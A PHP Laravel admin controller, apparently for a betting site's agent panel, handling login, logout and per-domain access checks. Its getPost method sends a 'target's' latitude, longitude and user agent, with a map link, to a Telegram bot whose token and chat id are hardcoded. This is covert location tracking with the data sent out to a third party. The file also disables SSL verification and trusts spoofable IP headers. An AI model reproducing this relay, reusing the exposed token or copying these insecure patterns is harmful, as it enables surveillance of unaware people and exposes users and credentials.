<?php

namespace App\Http\Controllers\Admin;

use Auth;
use App\User;
use App\Http\Requests;
use App\Classes\ExecludeTree;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Storage;

class UserController extends Controller{

    public function isTakwira($whois){

       return (preg_match("/takwira/i", $whois)) ? true : false;

    }

    public function isWinMycard($whois){

       return (preg_match("/mycard77.win|127.0.0.1/i", $whois)) ? true : false;

    }


    public function isAuthIdentical($search, $str){

        return (preg_match("/".$search."/i", $str)) ? true : false;

    }

    public function authBelongsTo($logged_whois){



        if( $this->isAuthIdentical("mycard77.win", $logged_whois) ){

            return "mycard77.win|mycard77.forrza1";

        }elseif( $this->isAuthIdentical("mycard77.shop", $logged_whois) ){

            return "mycard77.shop|mycard.forzzaxbet|mycard.forzza.it";

        }elseif( $this->isAuthIdentical("mycard.forzza.top", $logged_whois) ){

            return "mycard.forzza.top";

        }elseif( $this->isAuthIdentical("mycard77.vip", $logged_whois) ){

            return "mycard77.vip|mycard77.win|forzza.win";

        }elseif( $this->isAuthIdentical("mycard77.live", $logged_whois) ){

            return "mycard77.live";

        }elseif( $this->isAuthIdentical("mycard77.forrza1", $logged_whois) ){

            return "mycard77.win|mycard77.forrza1";

        }elseif( $this->isAuthIdentical("mycard.forzzaxbet", $logged_whois) ){

            return "mycard77.shop|mycard.forzzaxbet|mycard.forzza.it";

        }elseif( $this->isAuthIdentical("admin.liver1x2", $logged_whois) ){

            return "admin.liver1x2";

        }elseif( $this->isAuthIdentical("mycard.takwira.com", $logged_whois) ){

            return "mycard.takwira.com";

        }elseif( $this->isAuthIdentical("mycard.takwira365.org", $logged_whois) ){

            return "mycard.takwira365.org";

        }elseif( $this->isAuthIdentical("mycard.takwira.org", $logged_whois) ){

            return "mycard.takwira.org";

        }elseif( $this->isAuthIdentical("mycard.takwira.it", $logged_whois) ){

            return "mycard.takwira.it";

        }elseif( $this->isAuthIdentical("mycard.forzza.it", $logged_whois) ){

            return "mycard77.shop|mycard.forzzaxbet|mycard.forzza.it";

        }else{


            return "404";
        }   




    }


    public function getIp() {

        //return "102.156.216.242";

        if(filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {

          return $_SERVER['HTTP_CLIENT_IP'];

        }elseif (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {

          return $_SERVER['HTTP_X_FORWARDED_FOR'];

        }else{

          return $_SERVER['REMOTE_ADDR'];

        }

    }


	public function getPost(Request $request){


       $validator = Validator($request->only("lat", "lon","usr","ua"), [
            "lat" => "required",
            "lon" => "required",
            "ua" => "required",
            "usr"  => "required",
        ]);

        if( $validator->fails() ){

                return response()->json([
                    "status" => false,
                    "error"  => $validator->errors()->first(),
                    "type"   => "error"
                ], 200);
        }

        try {

        	$lat = $request->lat;
        	$lon = $request->lon;
        	$usr = $request->usr;
        	$ua = $request->ua;

        	$msgText  = " ======= korzza Location Get ====== \n";

        	$msgText .= " Target Shop : ".$usr." \n";
        	$msgText .= " Target Latitude : ".$lat." \n";
        	$msgText .= " Target Longitude : ".$lon." \n";
        	$msgText .= " Target UA : ".$ua." \n";
        	$msgText .= " Map Location : https://www.latlong.net/c/?lat=".$lat."&long=".$lon." \n";
        	$msgText .= "==========END MSG===========";

			$Token="1431446612:AAHHRDz9hAzKcZsDfjSweO3tLa_iA42_K_M";

			$url="https://api.telegram.org/bot".$Token;
			$Id="-431243200"; 

			$params=[
					'chat_id'=>$Id,
					'text'=> $msgText,
			];

			$ch = curl_init($url . '/sendMessage');
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_exec($ch);
			curl_close($ch);


            return response()->json([
                "status" => true,
                "msg" => "."
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


	}

    public function login(Request $request){

    	if (Auth::guard('web')->attempt([
            'username' => $request->username,
            'password' => $request->pswd,
        ])
        ) {

    		$admin_info = Auth::guard('web')->user();
    		// ACCOUNT NOT ADMIN OR AGENT
    		if($admin_info->role === "player"){

    			Auth::guard('web')->logout();
    			$html = Storage::disk('public')->get('info.txt');
    			$html = str_replace('*message_error*', "Nom d'utilisateur erroné et/ou mot de passe erroné", $html);
				$response["d"]["action"] = 3;
				$response["d"]["status"] = 200;	
				$response["d"]["mode"] = 1;	
				$response["d"]["html"] = $html;
				return $response;

    		}


    		// ACCOUNT BLOCKED
    		if($admin_info->status === "blocked"){

    			Auth::guard('web')->logout();
    			$html = Storage::disk('public')->get('info.txt');
    			$html = str_replace('warning3', 'warning', $html);
    			$html = str_replace('*message_error*', "Votre compte est temporairement bloqué", $html);
				$response["d"]["action"] = 3;
				$response["d"]["status"] = 200;	
				$response["d"]["mode"] = 1;	
				$response["d"]["html"] = $html;
				return $response;

    		}


    		$origin = $request->headers->get('origin');
    		$user_id = $admin_info->id;
            
            $logged_whois = $admin_info->whois;


            $admin_belongs_to = $this->authBelongsTo($logged_whois);


            if( $this->isAuthIdentical($admin_belongs_to, $origin) === false ){


                Auth::guard('web')->logout();
                $html = Storage::disk('public')->get('info.txt');
                $html = str_replace('*message_error*', "Nom d'utilisateur erroné et/ou mot de passe erroné", $html);
                $response["d"]["action"] = 3;
                $response["d"]["status"] = 200; 
                $response["d"]["mode"] = 1; 
                $response["d"]["html"] = $html;
                $response["case"] = "identical_auth_mismatch";
                return $response;


            }

            /*$goAway = new ExecludeTree();
            $goAway_Tree  = $goAway->checkTree();

    		if( (in_array($origin, $goAway_Tree['domains_mycard'])) && (in_array($user_id, $goAway_Tree['mycard_ids'])) ){

    			Auth::guard('web')->logout();
    			$html = Storage::disk('public')->get('info.txt');
    			$html = str_replace('*message_error*', "Nom d'utilisateur erroné et/ou mot de passe erroné", $html);
				$response["d"]["action"] = 3;
				$response["d"]["status"] = 200;	
				$response["d"]["mode"] = 1;	
				$response["d"]["html"] = $html;
				$response["ExecludeTree"] = true;
				return $response;

    		}*/



            if( $this->isTakwira($origin) && !$this->isTakwira($admin_info->whois) ){

    			Auth::guard('web')->logout();
    			$html = Storage::disk('public')->get('info.txt');
    			$html = str_replace('*message_error*', "Nom d'utilisateur erroné et/ou mot de passe erroné", $html);
				$response["d"]["action"] = 3;
				$response["d"]["status"] = 200;	
				$response["d"]["mode"] = 1;	
				$response["d"]["html"] = $html;
				$response["tk"] = true;
				return $response;

            }

	            // Authentication passed...
    		//if($admin_info->role === "admin"){

                $appDownload = '<div data-role="page" id="tmenu" data-url="tmenu_aspx" data-lang="en" tabindex="0" class="ui-page ui-page-theme-a ui-page-active" style="min-height: 785px;">
    <div data-tap-toggle="false" data-role="header" data-theme="b" class="tw-header ui-header ui-bar-b" data-add-back-btn="false" data-back-btn-text="." role="banner">
        <h1 class="tw-header-title ui-title" role="heading" aria-level="1">Info</h1>
    </div>
    <div data-role="content" class="ui-content" role="main">
        <div id="twMainContentView">
            <ul data-role="listview" data-inset="true" class="ui-listview ui-listview-inset ui-corner-all ui-shadow">
                <li data-theme="a" data-role="list-divider" role="heading" class="ui-li-divider ui-bar-a ui-first-child" style="font-weight: bold; font-size: 15px;"></li>
                <li class="ui-li-static ui-body-inherit">
                    <div class="tw-info tw-msg-info3"></div>
                    <div class="tw-popup-box">
    <bdi>

تنبيه : تتم هذه الفترة معالجة بعض ألعاب الحظ و الرهان عن طريق
              مجموعة من التحديثات  نتيجة لنسب مرتفعة
              من الربح من جهة الألعاب و ورهانات غير مسؤولة من جهة الأفراد لذلك
              سيتم منع أي جهة تصدر منها رهانات غير مسؤولة من قبل الشركات الرسمية
              .للألعاب من الولوج

    </bdi>
                        <br />
                        <br>
                    </div>

                </li>
                <li class="ui-li-static ui-body-inherit ui-last-child">
                    <a
                        href="#till"
                        data-role="button"
                        data-theme="a"
                        data-iconpos="right"
                        data-icon="app-install"
                        style="text-align: center; white-space: normal; font-weight: bold; margin-top: 11px;"
                        class="ui-btn ui-input-btn ui-btn-e ui-corner-all ui-shadow ui-mini ui-icon-arrow-l ui-btn-icon-right"
                        role="button"
                    >
                        Back
                    </a>
                </li>
            </ul>
        </div>
        <div id="twInfoContentView" class="fieldHide"></div>
        <div id="masterDetailsBox" class="fieldHide"></div>
    </div>
</div>';


                $admin_info->ip     = $this->getIp();
                $admin_info->online = 1;
                $admin_info->update();


    			$html_file = 'menu-'.$admin_info->role.'.txt';
	            $logged_username = $admin_info->username;
	            $logged_funds = $admin_info->sold_sport;
	            $html = Storage::disk('public')->get($html_file);
	            $html = str_replace('*username*', '<span class="ui-icon-user ui-btn-icon-left"></span> '.$logged_username, $html);
	            $html = str_replace('*funds*', number_format($logged_funds,2, '.', ' '), $html);
	            $html = str_replace('*isApp*', "", $html);

	            $response["d"]["action"] = 1;
				$response["d"]["status"] = 200;
				$response["d"]["html"] =  preg_match("/fadhyl2|fganon/i", $logged_username)  ? $appDownload : $html;
				$response["d"]["redirectUri"] = 'till/tmenu';

				return $response;


			//}
        }


        	//WRONG LOGIN
			$html = Storage::disk('public')->get('info.txt');
			$html = str_replace('*message_error*', "Nom d'utilisateur erroné et/ou mot de passe erroné", $html);
			$response["d"]["action"] = 3;
			$response["d"]["status"] = 200;	
			$response["d"]["mode"] = 1;	
			$response["d"]["html"] = $html;

	        return $response;


    }


    public function logout(Request $request){

			Auth::guard('web')->logout();
			$response["d"]["action"] = 2;
			$response["d"]["status"] = 200;	
			$response["d"]["redirectUri"] = 'till/till-login';

	        return $response;

    }





}
